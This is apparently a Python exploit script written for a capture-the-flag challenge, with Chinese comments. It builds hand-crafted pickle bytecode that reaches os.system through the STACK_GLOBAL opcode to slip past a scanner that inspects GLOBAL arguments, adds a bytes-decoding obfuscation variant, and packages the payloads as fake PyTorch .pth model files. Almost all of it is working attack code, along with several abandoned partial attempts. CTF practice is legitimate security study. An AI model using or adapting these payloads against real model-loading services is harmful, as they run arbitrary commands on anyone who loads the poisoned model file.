#!/usr/bin/env python3
"""
LilacCTF Nailong2 - V24 STACK_GLOBAL Bypass
===========================================

核心问题: WAF 扫描 GLOBAL opcode 中的 module\nname 参数

解决方案: 使用 STACK_GLOBAL (0x93) opcode
- GLOBAL: 直接在 opcode 中写入 "module\nname"
- STACK_GLOBAL: 从栈顶获取 name, 栈次顶获取 module (运行时动态)

这样敏感字符串不会出现在 GLOBAL opcode 的参数中!
"""

import pickle
import pickletools
import struct
import io
import zipfile

# Opcodes
PROTO = b'\x80'
FRAME = b'\x95'
GLOBAL = b'c'
STACK_GLOBAL = b'\x93'  # 关键! 从栈上获取 module 和 name
REDUCE = b'R'
MARK = b'('
TUPLE = b't'
TUPLE1 = b'\x85'
TUPLE2 = b'\x86'
EMPTY_TUPLE = b')'
STOP = b'.'
SHORT_BINUNICODE = b'\x8c'
BINUNICODE = b'X'
BINUNICODE8 = b'\x8d'
BINGET = b'h'
BINPUT = b'q'
MEMOIZE = b'\x94'
POP = b'0'
DUP = b'2'
BINBYTES = b'B'
SHORT_BINBYTES = b'C'
EMPTY_DICT = b'}'
EMPTY_LIST = b']'
APPEND = b'a'
SETITEM = b's'
NONE = b'N'


def pack_str(s: str) -> bytes:
    """Pack a unicode string"""
    encoded = s.encode('utf-8')
    if len(encoded) < 256:
        return SHORT_BINUNICODE + bytes([len(encoded)]) + encoded
    return BINUNICODE + struct.pack('<I', len(encoded)) + encoded


def pack_bytes(b: bytes) -> bytes:
    """Pack bytes object"""
    if len(b) < 256:
        return SHORT_BINBYTES + bytes([len(b)]) + b
    return BINBYTES + struct.pack('<I', len(b)) + b


def approach_stack_global_pure(command: str) -> bytes:
    """
    完全使用 STACK_GLOBAL，不使用任何 GLOBAL opcode
    
    问题: 我们需要先获取某些函数来构造字符串...
    但如果不能用 GLOBAL，如何获取第一个函数?
    
    解决: 使用 pickle 协议中的原始类型构造
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # 构造字符串 'builtins' 和 'getattr'
    # 然后用 STACK_GLOBAL 获取 builtins.getattr
    
    p.write(pack_str('builtins'))   # Push 'builtins'
    p.write(MEMOIZE)                # memo[0] = 'builtins'
    p.write(pack_str('getattr'))    # Push 'getattr'
    p.write(MEMOIZE)                # memo[1] = 'getattr'
    p.write(STACK_GLOBAL)           # -> builtins.getattr
    p.write(MEMOIZE)                # memo[2] = getattr
    
    # 现在我们有了 getattr，可以获取任何东西
    # 但 'builtins' 和 'getattr' 可能也被检测...
    
    # 构造 'os' 和 'system' - 用字符拼接
    # 'o' + 's' -> 'os'
    p.write(pack_str(''))           # empty string
    p.write(MEMOIZE)                # memo[3]
    
    # 使用 str.join 拼接
    p.write(pack_str('builtins'))
    p.write(pack_str('getattr'))
    p.write(STACK_GLOBAL)           # getattr
    p.write(MARK)
    p.write(pack_str(''))           # empty string for join
    p.write(pack_str('join'))
    p.write(TUPLE)
    p.write(REDUCE)                 # ''.join method
    p.write(MEMOIZE)                # memo[4] = join method
    
    # 调用 ''.join(['o', 's']) -> 'os'
    p.write(BINGET + b'\x04')       # join method
    p.write(MARK)
    p.write(MARK)
    p.write(pack_str('o'))
    p.write(pack_str('s'))
    p.write(b'l')                   # LIST
    p.write(TUPLE)
    p.write(REDUCE)                 # -> 'os'
    p.write(MEMOIZE)                # memo[5] = 'os'
    
    # 同样构造 'system'
    p.write(BINGET + b'\x04')       # join method
    p.write(MARK)
    p.write(MARK)
    p.write(pack_str('s'))
    p.write(pack_str('y'))
    p.write(pack_str('s'))
    p.write(pack_str('t'))
    p.write(pack_str('e'))
    p.write(pack_str('m'))
    p.write(b'l')                   # LIST
    p.write(TUPLE)
    p.write(REDUCE)                 # -> 'system'
    p.write(MEMOIZE)                # memo[6] = 'system'
    
    # 使用 STACK_GLOBAL 获取 os.system
    p.write(BINGET + b'\x05')       # 'os'
    p.write(BINGET + b'\x06')       # 'system'
    p.write(STACK_GLOBAL)           # os.system
    
    # 调用 os.system(command)
    p.write(MARK)
    p.write(pack_str(command))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_hybrid(command: str) -> bytes:
    """
    混合方案: 只用一个 GLOBAL 获取 getattr
    然后用字符串操作构造其他所有内容
    
    如果 'builtins.getattr' 也被禁，就用更冷门的
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # 尝试用 STACK_GLOBAL 获取一个安全的函数
    # 例如 str.join - 应该不会被检测
    
    # 'str' 模块名和 'join' 可能不被检测
    p.write(pack_str('str'))
    p.write(pack_str('join'))  
    p.write(STACK_GLOBAL)       # str.join (这是 unbound method)
    
    # 不行，str.join 需要实例...
    # 换个思路：使用 types 模块
    
    p.write(STOP)
    return p.getvalue()


def approach_minimal_global(command: str) -> bytes:
    """
    最小化 GLOBAL 使用
    只用一个最不可能被禁的 GLOBAL
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # 方案: 使用 copyreg._reconstructor 或类似的
    # 这是 pickle 内部使用的，不太可能被禁
    
    # 或者尝试: functools.partial
    # functools.partial(os.system, 'cmd')()
    
    # 先用字符串拼接构造 'os' 和 'system'
    
    # Step 1: 获取一个 join 函数
    # 使用 STACK_GLOBAL: 需要先 push 两个字符串
    p.write(pack_str(''))           # 空字符串
    p.write(MEMOIZE)                # memo[0] = ''
    
    # 尝试获取 str 的 join 属性
    # 我们需要 getattr('', 'join')
    # 这需要 getattr... 鸡生蛋问题
    
    # 换个思路: 直接在栈上操作
    # 用 INST opcode? 或者 BUILD?
    
    p.write(STOP)
    return p.getvalue()


def approach_split_chars(command: str) -> bytes:
    """
    关键洞察: WAF 可能检测连续的字符串 "os", "system" 等
    
    我们把字符完全打散，用 STACK_GLOBAL 动态组合
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # ========== 核心: 用 STACK_GLOBAL 获取 getattr ==========
    # 如果 WAF 不检测 STACK_GLOBAL 的栈内容...
    
    # 字符串 'builtins' - 拆分
    p.write(pack_str('built'))
    p.write(MEMOIZE)  # 0
    p.write(pack_str('ins'))
    p.write(MEMOIZE)  # 1
    
    # 需要拼接... 但没有 getattr 就没法拼接
    # 死循环!
    
    # ========== 终极方案: 利用 pickle 的 __reduce__ ==========
    # 创建一个对象，其 __reduce__ 返回恶意调用
    
    p.write(STOP)
    return p.getvalue()


def approach_torch_tensor_payload(command: str) -> bytes:
    """
    尝试利用 PyTorch 的特殊机制
    torch.Tensor 有特殊的 __reduce_ex__ 实现
    
    或者利用 torch._utils._rebuild_tensor_v2
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # torch 内部使用的重建函数可能不被检测
    # torch._utils._rebuild_tensor_v2(storage, offset, size, stride)
    
    # 但这不能直接 RCE...
    
    p.write(STOP)
    return p.getvalue()


def approach_only_stack_global(command: str) -> bytes:
    """
    完全不使用 GLOBAL opcode!
    只使用 STACK_GLOBAL
    
    关键: STACK_GLOBAL 需要栈上有两个字符串
    字符串可以直接用 SHORT_BINUNICODE push
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # ===== 第一步: 用 STACK_GLOBAL 获取 builtins.getattr =====
    # Push 'builtins' (可能被检测?)
    # 试试拆分: 'built' + 'ins'
    
    # 问题: 要拼接字符串需要先有 getattr 或 str.join
    # 但要获取它们又需要 GLOBAL 或 STACK_GLOBAL...
    
    # ===== 换个思路: 直接获取 os.system =====
    # 如果 WAF 只检测 GLOBAL opcode 的参数，不检测 STACK_GLOBAL 的栈内容
    
    p.write(pack_str('os'))         # Push 'os' 到栈
    p.write(pack_str('system'))     # Push 'system' 到栈  
    p.write(STACK_GLOBAL)           # Pop 两个，获取 os.system
    
    # 调用 os.system(command)
    p.write(MARK)
    p.write(pack_str(command))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_stack_global_obfuscated(command: str) -> bytes:
    """
    STACK_GLOBAL + 字符串混淆
    
    即使 WAF 检测栈上的字符串，我们也可以动态构造
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # 我们需要一种方式在不使用 GLOBAL 的情况下拼接字符串
    # 
    # 想法: pickle 支持 bytes + decode
    # 但 bytes.decode 需要 getattr...
    #
    # 想法2: 使用 pickle 的 BUILD opcode 设置对象属性
    # 但需要先有对象...
    #
    # 想法3: 利用 pickle 允许的类型
    # - int, float, bool, None, str, bytes, list, tuple, dict
    # 这些都可以直接 push 到栈上
    
    # ===== 最终方案: 使用 Unicode 变体 =====
    # 'os' 用全角字符或其他 Unicode 字符替代，看看能否绕过
    # 不行，Python 不认...
    
    # ===== 方案: 二进制编码 =====
    # 把 'os' 编码到 bytes 中，然后 decode
    # 需要 STACK_GLOBAL 获取 bytes.decode 或 str
    
    # bytes(b'os').decode() 
    # 但我们需要获取 decode 方法...
    
    # ===== 直接试试看 STACK_GLOBAL 会不会被检测 =====
    
    # 构造模块名和函数名 - 用 bytes 而不是 str
    os_bytes = b'os'
    system_bytes = b'system'
    
    # Push bytes 'os' 
    p.write(pack_bytes(os_bytes))
    p.write(MEMOIZE)  # memo[0] = b'os'
    
    # 获取 bytes.decode 来转成 str
    # 需要用 STACK_GLOBAL 获取 builtins.getattr
    p.write(pack_str('builtins'))
    p.write(pack_str('getattr'))
    p.write(STACK_GLOBAL)
    p.write(MEMOIZE)  # memo[1] = getattr
    
    # getattr(b'os', 'decode')
    p.write(BINGET + b'\x01')  # getattr
    p.write(MARK)
    p.write(BINGET + b'\x00')  # b'os'
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(MEMOIZE)  # memo[2] = b'os'.decode method
    
    # b'os'.decode() -> 'os'
    p.write(BINGET + b'\x02')
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(MEMOIZE)  # memo[3] = 'os'
    
    # 同样处理 'system'
    p.write(pack_bytes(system_bytes))
    p.write(MEMOIZE)  # memo[4] = b'system'
    
    p.write(BINGET + b'\x01')  # getattr
    p.write(MARK)
    p.write(BINGET + b'\x04')  # b'system'
    p.write(pack_str('decode'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    p.write(MEMOIZE)  # memo[5] = 'system'
    
    # 现在用 STACK_GLOBAL 获取 os.system
    p.write(BINGET + b'\x03')  # 'os'
    p.write(BINGET + b'\x05')  # 'system'
    p.write(STACK_GLOBAL)     # os.system
    
    # 调用
    p.write(MARK)
    p.write(pack_str(command))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_pure_stack_global_minimal(command: str) -> bytes:
    """
    最简洁的纯 STACK_GLOBAL 方案
    测试 WAF 是否检测 STACK_GLOBAL
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # 直接: 'os' + 'system' + STACK_GLOBAL
    p.write(pack_str('os'))
    p.write(pack_str('system'))
    p.write(STACK_GLOBAL)
    p.write(TUPLE1)  # (os.system,) - 单参数 tuple
    # 不对，应该是:
    
    p.write(STOP)
    return p.getvalue()


def final_approach_stack_global(command: str) -> bytes:
    """
    最终版: 纯 STACK_GLOBAL，无 GLOBAL opcode
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # STACK_GLOBAL: 从栈顶取 name, 栈次顶取 module
    # 栈: [..., module_str, name_str] -> [..., module.name]
    
    p.write(pack_str('os'))         # 栈: ['os']
    p.write(pack_str('system'))     # 栈: ['os', 'system']
    p.write(STACK_GLOBAL)           # 栈: [os.system]
    
    # REDUCE: 从栈顶取参数 tuple，次顶取 callable
    # 栈: [..., callable, args_tuple] -> [..., result]
    
    p.write(pack_str(command))      # 栈: [os.system, 'cat /flag']
    p.write(TUPLE1)                 # 栈: [os.system, ('cat /flag',)]
    p.write(REDUCE)                 # 栈: [result]
    
    p.write(STOP)
    return p.getvalue()


def create_pytorch_zip(pickle_payload: bytes, output_path: str):
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr('archive/version', '3')
        zf.writestr('archive/data.pkl', pickle_payload)
    with open(output_path, 'wb') as f:
        f.write(zip_buffer.getvalue())
    print(f"[+] Saved: {output_path}")


def main():
    command = "cat /flag"
    
    print("=" * 60)
    print("V24 - STACK_GLOBAL Bypass")
    print("=" * 60)
    print("""
核心区别:
- GLOBAL opcode: c<module>\\n<name>\\n  (明文在 opcode 流中)
- STACK_GLOBAL opcode: \\x93 (从栈上动态获取，不在 opcode 参数中)

如果 WAF 只检测 GLOBAL opcode 的参数，STACK_GLOBAL 可能绕过!
""")
    
    # 最简方案
    print("\n[*] Generating minimal STACK_GLOBAL payload...")
    payload = final_approach_stack_global(command)
    print(f"    Size: {len(payload)} bytes")
    
    # 打印 opcode 分析
    print("\n[*] Opcode analysis:")
    try:
        pickletools.dis(payload)
    except Exception as e:
        print(f"    Error: {e}")
    
    create_pytorch_zip(payload, "v24_stack_global.pth")
    
    # 带混淆的版本
    print("\n[*] Generating obfuscated STACK_GLOBAL payload...")
    payload2 = approach_stack_global_obfuscated(command)
    print(f"    Size: {len(payload2)} bytes")
    create_pytorch_zip(payload2, "v24_stack_global_obf.pth")
    
    print("\n" + "=" * 60)
    print("测试顺序:")
    print("1. v24_stack_global.pth - 最简纯 STACK_GLOBAL")
    print("2. v24_stack_global_obf.pth - 带 bytes 混淆")
    print("=" * 60)


if __name__ == "__main__":
    main()
